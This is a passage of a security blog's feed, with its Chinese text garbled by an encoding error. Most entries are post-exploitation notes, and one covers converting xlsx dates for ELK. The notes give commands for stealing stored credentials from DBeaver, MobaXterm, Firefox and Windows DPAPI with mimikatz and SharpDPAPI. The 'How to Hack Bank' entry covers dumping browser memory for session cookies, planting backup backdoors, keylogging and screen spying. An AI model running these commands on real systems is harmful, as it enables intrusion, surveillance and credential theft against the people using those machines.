¹æ®è§£å¯†å‡ºæ¥çš„idå»<code>data-sources.json</code>é‡Œé¢æ‰¾å¯¹åº”çš„IPå’Œç”¨æˆ·åã€‚</p><p>è€ç‰ˆæœ¬çš„å¯†ç æ˜¯å­˜å‚¨åœ¨:<code>C:\Users\&lt;users&gt;\.dbeaver4\General\.dbeaver-data-source.xml</code>ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨åœ¨çº¿è§£å¯†:<a href="http://dbeaver-password-decrypter.s3-website-us-west-2.amazonaws.com/">http://dbeaver-password-decrypter.s3-website-us-west-2.amazonaws.com/</a></p><h3 id="MobaXterm"><a href="#MobaXterm" class="headerlink" title="MobaXterm"></a>MobaXterm</h3><p>æœ‰ä¸€ä¸ª<code>.ini</code>çš„æ–‡ä»¶ï¼Œæœ‰å¯¹åº”çš„IPä¿¡æ¯å’Œç§é’¥åœ°å€<br>è€ç‰ˆæœ¬çš„å­˜å‚¨: C:\Users%USERNAME%\AppData\Roaming\MobaXterm<br>2020å¹´çš„ç‰ˆæœ¬: C:\Users%USERNAME%\Documents\MobaXterm</p><h3 id="VSCODE"><a href="#VSCODE" class="headerlink" title="VSCODE"></a>VSCODE</h3><p>Windowsä¸‹çš„é…ç½®æ–‡ä»¶åœ¨è¿™ä¸ªåœ°æ–¹:</p><pre class="line-numbers language-none"><code class="language-none">%APPDATA%\Code\User\settings.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥æ ¹æ®é…ç½®æ–‡ä»¶æ‰¾åˆ°ç¬”è®°å’Œsshç­‰å­˜å‚¨ä½ç½®</p><h3 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h3><p>ä¸‰å¥½å¸ˆå‚…è®²çš„å¾ˆè¯¦ç»†ï¼Œæˆ‘é€‰æ‹©ä½¿ç”¨firepwd.py:</p><pre class="line-numbers language-none"><code class="language-none">firefoxçš„é…ç½®æ–‡ä»¶ç›®å½•:%APPDATA%\Mozilla\Firefox\Profiles\xxxxxxxx.default\ä¸‹è½½è§£å¯†éœ€è¦çš„æ–‡ä»¶:key4.dbå’Œlogins.jsonä¸‹è½½è§£å¯†è„šæœ¬:https:&#x2F;&#x2F;github.com&#x2F;lclevy&#x2F;firepwdä¸Šé¢ä¸‰ä¸ªä¸œè¥¿æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹:python3 firepwd.py <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAFirefox%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAFirefox%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/</a></p><h3 id="æˆªå±"><a href="#æˆªå±" class="headerlink" title="æˆªå±"></a>æˆªå±</h3><ol><li>CSé‡Œé¢çš„<code>screenshot</code></li><li>msfé‡Œé¢: <code>use espia</code> <code>screengrab</code></li><li>msfçš„æŒç»­æˆªå±: <code>post/windows/gather/screen_spy</code></li><li>Win10è‡ªå¸¦: <code>psr.exe /start /gui 0 /output C:\cool.zip /maxlogsize 1</code></li></ol><h3 id="æœç´¢æ–‡ä»¶"><a href="#æœç´¢æ–‡ä»¶" class="headerlink" title="æœç´¢æ–‡ä»¶"></a>æœç´¢æ–‡ä»¶</h3><pre class="line-numbers language-none"><code class="language-none">åœ¨Cç›˜æœç´¢script.jsè¿™ä¸ªæ–‡ä»¶:dir &#x2F;s &#x2F;b C:\script.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#0x01-ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;0x01 ç¯å¢ƒ&quot;&gt;&lt;/a&gt;0x01 ç¯å¢ƒ&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;Linuxä¸»æœºwwwæƒé™&lt;/li&gt;
&lt;li&gt;ä¸»æœºæ— æ³•å‡ºå¤–ç½‘&lt;/li&gt;
&lt;li&gt;æ­£å‘ä»£ç†æ— æ³•ä½¿ç”¨&lt;/li&gt;
&lt;li&gt;Bæ®µå†…ç½‘&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;æ”¶é›†ä¿¡æ¯&quot;&gt;&lt;a href=&quot;#æ”¶é›†ä¿¡æ¯&quot; class=&quot;headerlink&quot; title=&quot;æ”¶é›†ä¿¡æ¯&quot;&gt;&lt;/a&gt;æ”¶é›†ä¿¡æ¯&lt;/h2&gt;&lt;p&gt;#####F-Scrack.py&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;è·å–Redis, ESç­‰
PS: Scrack.pyçš„mssqlæ¨¡å—çˆ†ç ´ä¸å‡†ç¡®ï¼Œå¯ä»¥è‡ªå·±å†™ä¸€ä¸ªç®€å•çš„

python Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;



&lt;h3 id=&quot;Redis&quot;&gt;&lt;a href=&quot;#Redis&quot; class=&quot;headerlink&quot; title=&quot;Redis&quot;&gt;&lt;/a&gt;Redis&lt;/h3&gt;&lt;p&gt;keyè¾ƒå¤šçš„æ—¶å€™ä¸è¦ä½¿ç”¨&lt;code&gt;keys *&lt;/code&gt;&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯: masterï¼Œæ•°é‡ï¼Œç‰ˆæœ¬å·
ä½¿ç”¨scanæŸ¥çœ‹keys: scan 0 match * count 100 
æŸ¥çœ‹ç±»å‹: type &amp;lt;key&amp;gt;
hashç±»å‹: hgetall &amp;lt;key&amp;gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;MySQL&quot;&gt;&lt;a href=&quot;#MySQL&quot; class=&quot;headerlink&quot; title=&quot;MySQL&quot;&gt;&lt;/a&gt;MySQL&lt;/h3&gt;&lt;p&gt;windowsä¸‹å¯ä»¥å…ˆæµ‹è¯•æ˜¯å¦å¯å†™å…¥æ’ä»¶ç›®å½•:&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Pythonå¤„ç†xlsxåˆ°ELK</title>
    <link href="https://jkme.github.io/2020/05/06/python-elk.html"/>
    <id>https://jkme.github.io/2020/05/06/python-elk.html</id>
    <published>2020-05-05T16:00:00.000Z</published>
    <updated>2022-01-21T03:39:54.159Z</updated>
    
    <content type="html"><![CDATA[<p>éœ€è¦æŠŠæ•°æ®ä»xlsxè¯»åˆ°elkï¼Œå†åšæ•°æ®åˆ†æï¼Œé‡åˆ°ä¸€ä¸ªé—®é¢˜æ˜¯æŠŠå½“åœ¨elké‡Œé¢å¤„ç†æ—¥æœŸç±»çš„æ•°æ®çš„æ—¶å€™ï¼Œéœ€è¦æŠŠæ•°æ®è½¬æ¢ä¸ºDateç±»å‹:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">float2utc</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">(</span><span class="token operator">*</span>xldate_as_tuple<span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>local <span class="token operator">=</span> pytz<span class="token punctuation">.</span>timezone<span class="token punctuation">(</span><span class="token string">"Asia/Shanghai"</span><span class="token punctuation">)</span>local_dt <span class="token operator">=</span> local<span class="token punctuation">.</span>localize<span class="token punctuation">(</span>date<span class="token punctuation">,</span> is_dst<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>utc_dt <span class="token operator">=</span> local_dt<span class="token punctuation">.</span>astimezone<span class="token punctuation">(</span>pytz<span class="token punctuation">.</span>utc<span class="token punctuation">)</span>timeStr <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span>utc_dt<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%dT%H:%M:%S.%f"</span><span class="token punctuation">)</span>timeStr <span class="token operator">=</span> timeStr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token comment">#cell = date.strftime('%Y/%m/%d %H:%M')</span><span class="token keyword">return</span> timeStr <span class="token operator">+</span> <span class="token string">"Z"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><a href="https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon">https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;éœ€è¦æŠŠæ•°æ®ä»xlsxè¯»åˆ°elkï¼Œå†åšæ•°æ®åˆ†æï¼Œé‡åˆ°ä¸€ä¸ªé—®é¢˜æ˜¯æŠŠå½“åœ¨elké‡Œé¢å¤„ç†æ—¥æœŸç±»çš„æ•°æ®çš„æ—¶å€™ï¼Œéœ€è¦æŠŠæ•°æ®è½¬æ¢ä¸ºDateç±»å‹:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-python&quot; data-language=&quot;python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;float2utc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;num&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
	date &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; datetime&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;datetime&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;xldate_as_tuple&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;num&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

	local &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; pytz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;timezone&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Asia/Shanghai&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
	local_dt &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;localize&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;date&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; is_dst&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
	utc_dt &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_dt&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;astimezone&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pytz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;utc&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
	timeStr &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; datetime&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;datetime&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;strftime&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;utc_dt&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;%Y-%m-%dT%H:%M:%S.%f&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
	timeStr &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; timeStr&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;token comment&quot;&gt;#cell = date.strftime(&#39;%Y/%m/%d %H:%M&#39;)&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; timeStr &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Z&quot;&lt;/span&gt;
&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;


&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon&quot;&gt;https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</summary>
    
    
    
    <category term="Learning" scheme="https://jkme.github.io/categories/Learning/"/>
    
    
  </entry>
  
  <entry>
    <title>How to Hack Bank</title>
    <link href="https://jkme.github.io/2020/04/22/how-to-hack-bank.html"/>
    <id>https://jkme.github.io/2020/04/22/how-to-hack-bank.html</id>
    <published>2020-04-21T16:00:00.000Z</published>
    <updated>2022-01-21T01:42:01.926Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>[Thread-Phineas-Phisher-Hack-Back-Bank]<a href="https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank">https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank</a></p></blockquote><h3 id="ä»æµè§ˆå™¨dumpç™»é™†Cookie"><a href="#ä»æµè§ˆå™¨dumpç™»é™†Cookie" class="headerlink" title="ä»æµè§ˆå™¨dumpç™»é™†Cookie"></a>ä»æµè§ˆå™¨dumpç™»é™†Cookie</h3><pre class="line-numbers language-none"><code class="language-none">procdump64 &#x2F;accepteula -r -ma PID_of_browserstrings64 &#x2F;accepteula * .dmp | findstr PHPSESSID 2&gt; nulfindstr PHPSESSID * .dmp&gt; tmpstrings64 &#x2F;accepteula tmp | findstr PHPSESSID 2&gt; nul<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å‡†å¤‡åè·¯"><a href="#å‡†å¤‡åè·¯" class="headerlink" title="å‡†å¤‡åè·¯"></a>å‡†å¤‡åè·¯</h3><ol><li>å¸¸ç”¨çš„æ“ä½œç”¨ä¸€ä¸ªåé—¨</li><li>ç•™ä¸€ä¸ªå¤‡ç”¨çš„åé—¨ï¼Œç¬¬ä¸€ä¸ªå¤±æ•ˆä¹‹åå¯ç”¨</li></ol><h3 id="æ”¶é›†ä¿¡æ¯"><a href="#æ”¶é›†ä¿¡æ¯" class="headerlink" title="æ”¶é›†ä¿¡æ¯"></a>æ”¶é›†ä¿¡æ¯</h3><p>ç”¨åˆ°ä¸€ä¸‹æ¨¡å—:</p><pre class="line-numbers language-none"><code class="language-none">MSFæ¯5sæˆªå±:post&#x2F;windows&#x2F;gather&#x2F;screen_spyå†åŠ ä¸Šä¸€ä¸ªé”®ç›˜è®°å½•å™¨ï¼Œé€šè¿‡è¿™ä¸¤ä¸ªä¸œè¥¿æ”¶é›†ä¿¡æ¯ï¼Œäº†è§£å¤§æ¦‚çš„å·¥ä½œæµç¨‹ã€‚ä½¿ç”¨Windowsè‡ªå¸¦çš„PSRæˆªå±ï¼špsr.exe &#x2F;start &#x2F;gui 0 &#x2F;output C:\Users\Dan\Desktop\cool.zip;Start-Sleep -s 20;psr.exe &#x2F;stop;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><pre class="line-numbers language-none"><code class="language-none">Hacking has made me feel alive. It started as a way to self-medicate depression. Later Irealized that, in reality, I could do something positive. I don&#39;t regret the way I grew up at all, it brought several beautiful experiences to my life. But I knew I couldn&#39;t continue living that way. So I began to spend more time away from my computer, with other people, learning to open myself to the world, to feel my emotions, to connect with others, to accept risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on my way.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;[Thread-Phineas-Phisher-Hack-Back-Bank]&lt;a href=&quot;https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank&quot;&gt;https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;ä»æµè§ˆå™¨dumpç™»é™†Cookie&quot;&gt;&lt;a href=&quot;#ä»æµè§ˆå™¨dumpç™»é™†Cookie&quot; class=&quot;headerlink&quot; title=&quot;ä»æµè§ˆå™¨dumpç™»é™†Cookie&quot;&gt;&lt;/a&gt;ä»æµè§ˆå™¨dumpç™»é™†Cookie&lt;/h3&gt;&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;procdump64 &amp;#x2F;accepteula -r -ma PID_of_browser
strings64 &amp;#x2F;accepteula * .dmp | findstr PHPSESSID 2&amp;gt; nul
findstr PHPSESSID * .dmp&amp;gt; tmp
strings64 &amp;#x2F;accepteula tmp | findstr PHPSESSID 2&amp;gt; nul&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;å‡†å¤‡åè·¯&quot;&gt;&lt;a href=&quot;#å‡†å¤‡åè·¯&quot; class=&quot;headerlink&quot; title=&quot;å‡†å¤‡åè·¯&quot;&gt;&lt;/a&gt;å‡†å¤‡åè·¯&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;å¸¸ç”¨çš„æ“ä½œç”¨ä¸€ä¸ªåé—¨&lt;/li&gt;
&lt;li&gt;ç•™ä¸€ä¸ªå¤‡ç”¨çš„åé—¨ï¼Œç¬¬ä¸€ä¸ªå¤±æ•ˆä¹‹åå¯ç”¨&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;æ”¶é›†ä¿¡æ¯&quot;&gt;&lt;a href=&quot;#æ”¶é›†ä¿¡æ¯&quot; class=&quot;headerlink&quot; title=&quot;æ”¶é›†ä¿¡æ¯&quot;&gt;&lt;/a&gt;æ”¶é›†ä¿¡æ¯&lt;/h3&gt;&lt;p&gt;ç”¨åˆ°ä¸€ä¸‹æ¨¡å—:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;MSFæ¯5sæˆªå±:
post&amp;#x2F;windows&amp;#x2F;gather&amp;#x2F;screen_spy

å†åŠ ä¸Šä¸€ä¸ªé”®ç›˜è®°å½•å™¨ï¼Œé€šè¿‡è¿™ä¸¤ä¸ªä¸œè¥¿æ”¶é›†ä¿¡æ¯ï¼Œäº†è§£å¤§æ¦‚çš„å·¥ä½œæµç¨‹ã€‚


ä½¿ç”¨Windowsè‡ªå¸¦çš„PSRæˆªå±ï¼š
psr.exe &amp;#x2F;start &amp;#x2F;gui 0 &amp;#x2F;output C:\Users\Dan\Desktop\cool.zip;
Start-Sleep -s 20;
psr.exe &amp;#x2F;stop;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;


&lt;h3 id=&quot;END&quot;&gt;&lt;a href=&quot;#END&quot; class=&quot;headerlink&quot; title=&quot;END&quot;&gt;&lt;/a&gt;END&lt;/h3&gt;&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;Hacking has made me feel alive. It started as a way to self-medicate depression. Later I
realized that, in reality, I could do something positive. I don&amp;#39;t regret the way I grew up at 
all, it brought several beautiful experiences to my life. But I knew I couldn&amp;#39;t continue 
living that way. So I began to spend more time away from my computer, with other people, 
learning to open myself to the world, to feel my emotions, to connect with others, to accept 
risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is 
more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on 
my way.&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Fun" scheme="https://jkme.github.io/categories/Fun/"/>
    
    
  </entry>
  
  <entry>
    <title>é€šè¿‡DPAPIè·å–windowsèº«ä»½å‡­è¯</title>
    <link href="https://jkme.github.io/2020/04/13/dpapi-pass-dump.html"/>
    <id>https://jkme.github.io/2020/04/13/dpapi-pass-dump.html</id>
    <published>2020-04-12T16:00:00.000Z</published>
    <updated>2022-01-21T02:20:13.601Z</updated>
    
    <content type="html"><![CDATA[<h3 id="èƒŒæ™¯ä»‹ç»"><a href="#èƒŒæ™¯ä»‹ç»" class="headerlink" title="èƒŒæ™¯ä»‹ç»"></a>èƒŒæ™¯ä»‹ç»</h3><p>DPAPI(Date Protection Application Programming Interface)ï¼Œä»windows2000ä¹‹åï¼Œå¾®è½¯æä¾›çš„ä¸€ä¸ªç‰¹æ®Šæ•°æ®ä¿æŠ¤æ¥å£ï¼Œä½¿ç”¨äº†å¯¹ç§°çš„åŠ è§£å¯†å‡½æ•°å¯¹å¯†ç åŠ å¯†ã€‚åŒ…æ‹¬:</p><ul><li>IEã€Chromeå¯†ç ç™»é™†è¡¨å•çš„è‡ªåŠ¨å®Œæˆ</li><li>é‚®ç®±å®¢æˆ·ç«¯ç”¨æˆ·å¯†ç </li><li>FTPç®¡ç†è´¦æˆ·å¯†ç </li><li>è¿œç¨‹æ¡Œé¢èº«ä»½å¯†ç </li><li>â€¦â€¦</li></ul><p>æŸ¥æ‰¾æœ¬åœ°çš„Credentials:<br>é€šå¸¸çš„ä¿å­˜ä½ç½®:</p><ul><li><code>%appdata%\Microsoft\Credentials</code></li><li><code>%localappdata%\Microsoft\Credentials</code></li><li><code>%userprofile%\AppData\Local\Microsoft\Credentials\*</code></li></ul><p>å› ä¸ºæ–‡ä»¶è¢«éšè—ï¼Œå‘½ä»¤è¡Œä¸‹éœ€è¦æŸ¥çœ‹éœ€è¦åŠ ä¸Š<code>/a</code>å¯ä»¥çœ‹åˆ°:</p><pre class="line-numbers language-none"><code class="language-none">dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials\*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="è·å–GUID"><a href="#è·å–GUID" class="headerlink" title="è·å–GUID"></a>è·å–GUID</h3><pre class="line-numbers language-none"><code class="language-none"># æ‰“å°ç»“æ„ä½“ä¿¡æ¯mimikatz dpapi::cred &#x2F;in:&quot;%localappdata%\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">**BLOB**  dwVersion          : 00000001 - 1  guidProvider       : &#123;xf9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;  dwMasterKeyVersion : 00000001 - 1  guidMasterKey      : &#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125;  dwFlags            : 20000000 - 536870912 (system ; )  dwDescriptionLen   : 00000012 - 18  szDescription      : æœ¬åœ°å‡­æ®æ•°æ®  algCrypt           : 00006610 - 26128 (CALG_AES_256)  dwAlgCryptLen      : 00000100 - 256  dwSaltLen          : 00000020 - 32  pbSalt             : 00bcc91d576813f05e286f96b9ae3f97aef0922bb7c97b9c93b978d75027a8dc  dwHmacKeyLen       : 00000000 - 0  pbHmackKey         :   algHash            : 0000800e - 32782 (CALG_SHA_512)  dwAlgHashLen       : 00000200 - 512  dwHmac2KeyLen      : 00000020 - 32  pbHmack2Key        : 109ef886e7807e15e7918ec1773e768b50900664d88739e42a80592a1af52d51  dwDataLen          : 00002a70 - 10864  pbData             : xxxxxxz  dwSignLen          : 00000040 - 64  pbSign             : xxxxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>guidMasterKeyæŒ‡å‘MasterKeyçš„ç´¢å¼•,æ˜¯å‡­æ®çš„GUIDï¼Œ</p><h3 id="è·å–MasterKey"><a href="#è·å–MasterKey" class="headerlink" title="è·å–MasterKey"></a>è·å–MasterKey</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz sekurlsa::dpapi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Authentication Id : 0 ; 374001 (00000000:0005b4f1)Session           : RemoteInteractive from 2User Name         : AdministratorDomain            : PC-201908211659Logon Server      : PC-201908211659Logon Time        : 2020&#x2F;3&#x2F;22 14:23:45SID               : S-1-5-21-4128703178-143578513-755070304-500 [00000000] * GUID      :&#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125; * Time      :2020&#x2F;4&#x2F;13 10:45:31 * MasterKey :1d30e724aab2b4ee5c83707c5xxx * sha1(key) :xxxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ ¹æ®<code>GUID:&#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125;</code>æ‰¾åˆ°å…³è”çš„Masterkey, è¿™ä¸ªMasterKeyå°±æ˜¯åŠ å¯†çš„å¯†é’¥</p><p>###è§£å¯†<br>æ ¹æ®æ‰¾åˆ°çš„Credentialså’ŒMaterKey,ä½¿ç”¨mimikatzè§£å¯†:</p><pre class="line-numbers language-none"><code class="language-none">mimikatz dpapi::cred &#x2F;in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\&lt;Credentials&gt; &#x2F;masterkey:&lt;MasterKey&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="sharpDPAPI"><a href="#sharpDPAPI" class="headerlink" title="sharpDPAPI"></a>sharpDPAPI</h4><p>è‡ªåŠ¨åŒ–åˆ©ç”¨å·¥å…·ï¼Œä¸€é”®dumpï¼Œåœ¨CNAè„šæœ¬ä¸­ä¿®æ”¹<code>$SharpDPAPI::AssemblyPath</code>ä¸ºæœ¬æœºå™¨ä¸Šé¢sharpDPAPI.exeçš„ç»å¯¹è·¯å¾„ï¼Œä¸ç”¨ä¸Šä¼ 